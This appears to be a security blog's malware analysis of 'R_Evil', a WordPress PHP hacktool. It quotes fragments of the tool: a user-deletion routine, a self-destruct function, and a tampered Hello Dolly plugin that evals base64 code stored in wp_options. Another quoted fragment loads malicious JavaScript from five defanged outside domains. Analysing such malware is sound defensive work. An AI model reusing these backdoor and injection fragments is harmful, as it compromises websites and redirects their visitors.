@@ -1,0 +1,159 @@
+R_Evil WordPress Hacktool & Malicious JavaScript Injections
+
+We often see hackers reusing the same malware, with only a few new adjustments to obfuscate the code so that it is more difficult for scanning tools to detect.
+However, sometimes entirely new attack tools are created and deployed by threat actors who don’t want to rely on obfuscating existing malware.
+R_Evil WordPress PHP malware
+Confusing Name – R_Evil vs REvil
+REvil is a group of ransomware (primarily) that has targeted several high-profile victims throughout 2020 — but are probably most well known for their ransomware attack against Travelex, which netted them a $2.3 million ransom payout.
+During a recent investigation, we came across a sample of malware containing an R_Evil function. Closer analysis revealed that it’s simply an abbreviation for “delete_evil” — and it’s primary purpose is to remove a WordPress user from the infected website. So, despite the name similarity, it doesn’t seem affiliated with the ransomware group REvil.
+if(cod == 'delete_evil'){
+code = `include('$wdir' . 'wp-config.php');
+require_once ('$wdir' . 'wp-admin/includes/user.php');
+\$user = get_user_by( 'email', 'sehefow374@mailimail.com' );
+wp_delete_user(\$user->id);`;
+}
+...
+onclick=Excod('delete_evil'); style='cursor:pointer; color:#00f'>R_Evil</a> _ <a
+
+R_Evil/delete_evil function
+cpl.php & Secondary Files
+We were not able to recover all of the secondary files that make up the overall tool, but we did recover the main PHP file from which they are originally loaded from. Surprisingly, the PHP code was only obfuscated with base64 encoding and gz compression within a file named cpl.php.
+./wp-content/cpl.php
+
+A suicide/self-destruct PHP function is likely why the secondary files did not exist when we investigated the issue:
+function suicide(){
+if(function_exists('update_option')){
+setcookie(get_option('dolly_work'),'',time()-3600);
+update_option('hello_dolly', '', true );
+update_option('dolly_work', '', true );
+} else {
+@unlink(__FILE__);
+}
+
+@unlink('config_wp.php');
+@unlink('ii.php');
+@unlink('zpl.php');
+@unlink('pl.php');
+@unlink('2pl.php');
+@unlink('cpl.php');
+@unlink('upl.php');
+@unlink('_task');
+@unlink('_task_n');
+@unlink('_taskc');
+@unlink('_task_nc');
+@unlink('_task_nn');
+@unlink('_worker.php');
+@unlink('_log');
+@unlink('_cleaner.php');
+@unlink('_error_log');
+@unlink('big_log');
+@unlink('wp_log');
+@unlink('manual_log');
+
+die('God job!');
+}
+
+PHP function responsible for deleting the secondary files which are used for certain features
+Some of the secondary files are created by the main PHP file, cpl.php, but not all of them — for example, zpl.php.
+Tool’s Custom Functions
+There are at least 22 custom functions defined within the cpl.php file that are responsible for malicious behavior such as file modifications, downloading, executing PHP, and scanning files.
+restore();
+file_man();
+edit_file();
+save_file();
+save_norm();
+delete_file();
+delete_zpl();
+exec_php();
+suicide();
+make_worker();
+manage_file();
+download000();
+chmod_file();
+renew_file();
+manual_av();
+manual_wp();
+make_wp();
+copy_zpl();
+update_wordpress();
+debug_wordpress();
+delete_md5();
+delete_name();
+
+Many of these functions are what you would expect to see from PHP shell malware functions, but some of them stood out as unusual — for example functions which suggest updating or debugging WordPress, restoring files, or even scanning for malware:
+restore();
+delete_zpl();
+manual_av();
+manual_wp();
+make_wp();
+copy_zpl();
+update_wordpress();
+debug_wordpress();
+delete_md5();
+delete_name();
+
+manual_av() Function
+The antivirus function manual_av() refers to the malware’s capability to scan the infected website for a range of common website malware.
+The hacktool scans for malware based on signature arrays of regex strings or filenames which are loaded from a secondary file named _worker.php and created by cpl.php.
+The tool also uses other secondary PHP files for creating and managing MD5 hashes which are used for detecting other malware on the infected website, but we weren’t able to obtain them for analysis.
+add_exception.php
+del_base.php
+insert_to_base.php
+table.php
+
+For further context, here is an example of the signatures found within the file _worker.php:
+I can see from the domains in the second code field that these signatures are not old. They contain signatures for cleaning a number of recent mass WordPress injections, used to redirect infected websites.
+So far, this appears to be more of a website cleaning tool, as it can be used to clean malware and troubleshoot website issues. For example, using the function update_wordpress() to replace core WordPress files, or debug_wordpress() to quickly enable debug mode in the website’s wp-config.php file.
+“Hello Dolly” WordPress Core Injection
+After further analysis of the main PHP file and its functions, it was found that the tool contained a variable named $dolly_code with suspicious base64 encoded data.
+After decoding the sample, the data ended up being a modified version of the core WordPress file: ./wp-content/plugins/hello.php.
+The modifications to the core file are just a few lines of code, but they substantially change the purpose of the file.
+$admin_head = get_option('admin_head');
+...
+$admin_body =  $admin_head(get_option('admin_footer'),get_option('admin_body'));
+...
+$admin_body (get_option('dolly_css'));
+
+add_action( 'admin_head', 'dolly_css' );
+
+These lines of code use the WordPress functions get_option and add_action to load malicious code which is injected into the WordPress database table wp_options from the main cpl.php file.
+if(update_option('admin_head','create_function'))
+...
+if(update_option('admin_body','eval(base64_decode($_));'))
+...
+if(update_option('admin_footer','$_'))
+...
+if(update_option('dolly_css','CgpmdW5jdGlvbiBoZWxsb19jaGVja19zaWcoJHNpZ24sJGRhdGEpewoJCgkkcHVia2V[redacted for brevity]
+
+Once get_option and add_action are run, we end up with a PHP function that is executed whenever a WordPress admin page is loaded. It essentially evaluates the base64 payload, dolly_css, which is stored within the wp_options table.
+Even though the malicious dolly_css code is loaded on admin pages, it still contains condition checks for the referrer, cookie, and user-agent of incoming HTTP requests. These condition checks are run by custom functions that are confirmed before the code executes:
+if ( hello_ref() && hello_cookie() && hello_ua() ){
+
+If all conditions are met, then the PHP code injects malicious JavaScript from five separate sources onto the front-end of the website.
+function hello_scripts_method() {
+
+wp_enqueue_script('hello_newscript0', 'hxxps://wirewuss[.]com/pwa/i.php');
+wp_enqueue_script('hello_newscript1', 'hxxps://www.avocats-larochesuryon[.]com/images/i.php');
+wp_enqueue_script('hello_newscript2', 'hxxps://www.vacavilla[.]com/fileadmin/i.php');
+wp_enqueue_script('hello_newscript3', 'hxxp://wioe[.]com/chamber/i.php');
+wp_enqueue_script('hello_newscript4', 'hxxp://www.o-doo[.]com/extract/i.php');
+
+}
+
+if ( hello_ref() && hello_cookie() && hello_ua() ){
+
+add_action( 'wp_enqueue_scripts', 'hello_scripts_method' );
+
+}
+
+Here’s what the injected JavaScript looks like from the front-end source of an infected site:
+
+The JavaScript behavior loaded in this example is similar to other websites impacted by this massive WordPress infection: it redirects to a “prize” or “survey” landing page whenever someone loads the compromised website and makes an interaction on the front end.
+
+Injection Source
+So, how is the malicious “Hello, Dolly” payload injecting data into the ./wp-content/plugins/hello/hello.php and database table wp_options?
+All of this malicious behavior is handled by cpl.php’s interface, which scans available directories for the WordPress configuration file wp-config.php and allows the attacker to click a green arrow to run the injection and change the home/site url:
+
+Conclusion
+It’s unclear why the attackers have selected a tool with scanning features, but it’s possible that they may be simply trying to remove existing malware to evade detection. Whatever the case, it is an interesting multi-file PHP hacktool that is targeted for WordPress installations.
+There are a couple of solutions you can employ to detect this type of malicious behavior. If you have a plugin or server-side scanning tool that monitors for file changes, modifications such as these changes to the ./wp-content/plugins/hello/hello.php file will be detected so that you can be alerted of any potential indicators of compromise.
